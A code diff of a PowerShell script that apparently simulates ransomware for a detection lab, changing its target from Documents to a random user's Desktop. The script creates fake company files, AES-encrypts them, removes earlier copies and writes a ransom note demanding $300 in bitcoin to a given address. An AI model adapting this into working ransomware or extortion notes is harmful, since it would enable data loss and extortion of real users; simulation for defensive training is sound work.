@@ -1,4 +1,4 @@
- # Define encryption key and IV (Initialization Vector) for AES
+# Define encryption key and IV (Initialization Vector) for AES
 $key = [System.Text.Encoding]::UTF8.GetBytes("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx") # 32 characters for AES-256
 $iv = [byte[]](1..16) # IV should be 16 bytes for AES
 
@@ -14,6 +14,28 @@ function Encrypt-Text($plainText, $key, $iv) {
 
     $aes.Dispose()
     return $encryptedBytes
+}
+
+# Get all potential user directories from C:\Users\
+$usersPath = "C:\Users"
+$userDirectories = Get-ChildItem -Directory $usersPath | Where-Object {
+    $_.Name -notin @("Public", "Default", "Default User", "All Users", "Administrator")
+}
+
+# Check if any valid users were found
+if ($userDirectories.Count -eq 0) {
+    Write-Error "No valid user directories found in C:\Users"
+    exit
+}
+
+# Select a random user directory
+$randomUser = $userDirectories | Get-Random
+$desktopFolder = Join-Path $randomUser.FullName "Desktop"
+
+# Check if the Desktop folder exists for the selected user
+if (-not (Test-Path $desktopFolder)) {
+    Write-Error "Desktop folder not found for user: $($randomUser.Name)"
+    exit
 }
 
 # Fake company information
@@ -32,30 +54,41 @@ function Get-RandomFileName {
     return "$randomNumber`_$fileName"
 }
 
-# Clean up existing .pwncrypt files in the Documents folder
-$existingFiles = Get-ChildItem -Path $documentsFolder -Filter "*.pwncrypt.txt"
+# Clean up existing .pwncrypt files in the Desktop folder
+$existingFiles = Get-ChildItem -Path $desktopFolder -Filter "*.pwncrypt.txt" -ErrorAction SilentlyContinue
 foreach ($file in $existingFiles) {
     Remove-Item $file.FullName -Force
 }
 
-# Create fake text files in the Documents folder, encrypt them, then delete the originals
+
+# Create fake text files in the Desktop folder, encrypt them, then delete the originals
 foreach ($file in $fakeFiles.Keys) {
-    # Generate a random file name
-    $randomFileName = Get-RandomFileName $file.Replace('.txt', '.pwncrypt.txt')
+    try {
+        # Generate a random file name
+        $randomFileName = Get-RandomFileName $file.Replace('.txt', '.pwncrypt.txt')
 
-    # Define the file path with the random name
-    $filePath = Join-Path $documentsFolder $randomFileName
+        # Define the file path with the random name
+        $filePath = Join-Path $desktopFolder $randomFileName
 
-    # Write the fake company information to the text file
-    $fakeContent = $fakeFiles[$file]
-    Set-Content -Path $filePath -Value $fakeContent
+        # Write the fake company information to the text file
+        $fakeContent = $fakeFiles[$file]
+        Set-Content -Path $filePath -Value $fakeContent
 
-    # Encrypt the file content
-    $encryptedContent = Encrypt-Text $fakeContent $key $iv
+        # Encrypt the file content
+        $encryptedContent = Encrypt-Text $fakeContent $key $iv
 
-    # Write the encrypted content to the new file
-    [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
+        # Write the encrypted content to the new file
+        [System.IO.File]::WriteAllBytes($filePath, $encryptedContent)
+    } catch {
+        Write-Error "An error occurred while processing the file $($file): $($_)"
+    }
 }
 
-# Write the decryption instructions in the Documents folder
-"Your files have been encrypted.`nTo get the decryption key, send \$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath "$($documentsFolder)\__________decryption-instructions.txt" -Force
+$decryptionInstructionsPath = Join-Path $desktopFolder "__________decryption-instructions.txt"
+
+if (Test-Path -Path $decryptionInstructionsPath) {
+    Remove-Item -Path $decryptionInstructionsPath -Force
+}
+# Write the decryption instructions in the Desktop folder
+
+"Your files have been encrypted.`nTo get the decryption key, send \$300 worth of bitcoin to 14ZuDWhFL9mZUfZpsibLA2dysojP9fCFW1" | Out-File -FilePath $decryptionInstructionsPath -Force
